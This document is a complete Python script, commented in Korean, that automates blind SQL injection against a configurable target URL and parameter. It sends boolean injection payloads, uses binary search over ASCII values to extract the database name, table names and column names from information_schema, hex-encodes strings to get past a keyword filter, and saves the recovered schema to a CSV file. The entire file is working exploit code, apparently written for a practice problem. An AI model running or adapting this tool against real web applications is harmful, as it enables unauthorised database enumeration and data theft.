#!/usr/bin/env python 3.8
import requests
import os

VICTIM = 'http://test.mydomain.com/prob.php'  #진단할 URL
PARAM = "pw"  # Blind SQL injection Payload를 포함할 파라미터
BLIND_CHECK_STR = 'Hello admin'  # Blind SQL Injection 참/거짓을 판단할 텍스트
FILTER_STR = 'hpcnt'
FILEPATH = os.getcwd() + '/result/'


# Blind Sql Injection 결과 출력하는 함수
def print_result(db_name, column_dict):
    line_count = 0
    print("{0:#^80}".format(" result "))
    print("{0:^80}".format("DB name : " + db_name))
    print("{0:#^80}".format(""))
    for table, columns in column_dict.items():
        line_count += 1
        print("{0:^80}".format("Table name : %s" % table))
        print("{0:^80}".format('Column List : '+' / '.join(columns)))
        if not (line_count is len(column_dict)):
            print("{0:-^80}".format(""))
    print("{0:#^80}".format(""))


def save_result(db_name, column_dict):
    with open(FILEPATH + db_name + '.csv', encoding="utf-8", mode='w') as out:
        cols = ['table_name', 'column_list']
        out.write(','.join(cols) + "\n")
        for table, columns in column_dict.items():
            out.write(table + ',' + '/'.join(columns) + '\n')
        print(FILEPATH + db_name + '.csv saved..')


# DB 명, 테이블명, 컬럼 이름 중 필터링 되고 있는 문자열이 있으면 hex값으로 변환하는 함수
# 예제에서는 hpcnt 문자열이 필터링 되고 있으므로 hex값을 이용해 우회 가능
def check_filtering_str(checked_str, filter_str):
    if filter_str in checked_str:
        convert_str = "0x" + checked_str.encode("utf8").hex()
    else:
        convert_str = "'" + checked_str + "'"
    return convert_str


# Blind SQL Injection payload가 담긴 http request 후 response를 받아오는 함수
def get_response(payload):
    params = {PARAM: payload}
    response = requests.get(VICTIM, params=params)
    return response


# 응답값 내에 BLIND_CHECK_STR 값이 존재하는지 리턴하는 함수
def has_blind_check_str(response):
    if BLIND_CHECK_STR in response.text:
        return True
    else:
        return False


# 이진탐색법 이용해 Blind Sql injection 참/거짓 구분하는 함수
# ascii 코드로 알파벳 찾을 때 사용
def binary_search(query, value_length):
    result = ''
    for i in range(1, value_length + 1):
        start = 0
        end = 127
        while start <= end:
            payload = query
            mid = (start + end) // 2
            if has_blind_check_str(get_response(payload.format(i, '=', mid))):
                result += chr(mid)
                # print(result)
                break
            elif has_blind_check_str(get_response(payload.format(i, '<', mid))):
                end = mid - 1
            else:
                start = mid + 1
    return result


# 순차 탐색 알고리즘을 이용해 Blind Sql Injection 참/거짓 구분하는 함수
# DB 명, 테이블 명, 컬럼 명 길이 구할 때 사용
def sequential_search(query, number):
    for i in range(0, number + 1):
        payload = query.format(i)
        # print(query)
        if not has_blind_check_str(get_response(payload)):
            length = i
            if length == 0:
                raise ArithmeticError
            return length
    raise OverflowError


# DB 명 구하는 함수
def get_db_name():
    # DB 이름 길이 가져오기
    query = "1' or length(database( )) > {0}#"
    name_length = sequential_search(query, 30)

    # DB 이름 가져오기
    print('Fetching DB Name...')
    query = "1' or ascii(substring(database( ), {0}, 1)) {1} {2}#"
    db_name = binary_search(query, name_length)
    print("{0:=^40}".format(""))
    print("DB Name is " + db_name)
    print("")
    return db_name


# DB 내에 있는 테이블 목록 가져오는 함수
def get_tables_name(db_name):
    # DB 내 테이블 갯수 가져오기
    query = "1' or (select count(table_name) from information_schema.tables where table_schema=" \
            + check_filtering_str(db_name, FILTER_STR) + ") > {0}#"
    table_count = sequential_search(query, 50)

    # DB 내 각 테이블들의 이름 길이 가져오기
    table_names_length_list = []
    for i in range(0, table_count):
        query = "1' or (select length(table_name) from information_schema.tables where table_schema=" \
                + check_filtering_str(db_name, FILTER_STR) + " limit " + str(i) + ", 1) > {0}#"
        table_names_length_list.append(sequential_search(query, 50))

    # DB 내 테이블 목록 가져오기
    tables_name = []
    print('Fetching tables name...')
    print("{0:=^40}".format(""))
    for i in range(0, table_count):
        print("table " + str(i + 1) + " start!")
        query = "1' or (select ascii(substring(table_name,{0},1)) from information_schema.tables where table_schema=" \
                + check_filtering_str(db_name, FILTER_STR) + " limit " + str(i) + ", 1) {1} {2}#"
        tables_name.append(binary_search(query, table_names_length_list[i]))

    print("{0:=^40}".format(""))
    for i in range(0, table_count):
        print("table : " + str(i + 1) + " : " + tables_name[i])
    print("")
    return tables_name


# 테이블 내에 있는 컬럼 목록 가져오는 함수
def get_columns_name(table_name):
    # 테이블 내 컬럼 갯수 가져오기
    query = "1' or (select count(*) from information_schema.columns where table_name=" \
            + check_filtering_str(table_name, FILTER_STR) + ") > {0}#"
    column_count = sequential_search(query, 100)

    # 테이블 내 각 컬럼들의 이름 길이 가져오기
    column_list_length = []
    for i in range(0, column_count):
        query = "1' or (select length(column_name) from information_schema.columns where table_name=" \
                + check_filtering_str(table_name, FILTER_STR) + " limit " + str(i) + ", 1) > {0}#"
        column_list_length.append(sequential_search(query, 50))

    # 테이블 내 컬럼 목록 가져오기
    columns_name = []
    print('Fetching columns name...')
    print("{0:=^40}".format(""))
    for i in range(0, column_count):
        print("table " + table_name + "'s column " + str(i + 1) + " start!")
        query = "1' or (select ascii(substring(column_name,{0},1)) from information_schema.columns where table_name=" \
                + check_filtering_str(table_name, FILTER_STR) + " limit " + str(i) + ", 1) {1} {2}#"
        columns_name.append(binary_search(query, column_list_length[i]))

    print("{0:=^40}".format(""))
    for i in range(0, column_count):
        print("table : " + table_name + " / Column " + str(i + 1) + " : " + columns_name[i])
    print("")
    return columns_name


# 메인 함수
def main():
    db_name = ''
    tables_name = []
    column_dict = {}
    admin_pw = ''

    try:
        db_name = get_db_name()

        tables_name = get_tables_name(db_name)

        for table_name in tables_name:
            column_dict[table_name] = get_columns_name(table_name)
            print(column_dict[table_name])
        print("\n\n")

        print_result(db_name, column_dict)
        save_result(db_name, column_dict)

    except OverflowError:
        print("Error : DB, Column, Table 이름의 길이가 예상보다 깁니다.")
    except ArithmeticError:
        print("Error : DB, Column, Table 이름을 가져오지 못했습니다.")
    except requests.exceptions.RequestException:
        print("Error : WEB 서버에 접근할수 없습니다.")
    except Exception as ex:
        print("Error : 알 수 없는 에러로 DB 이름을 가져오지 못했습니다.\n", ex.with_traceback())


if __name__ == "__main__":
    main()


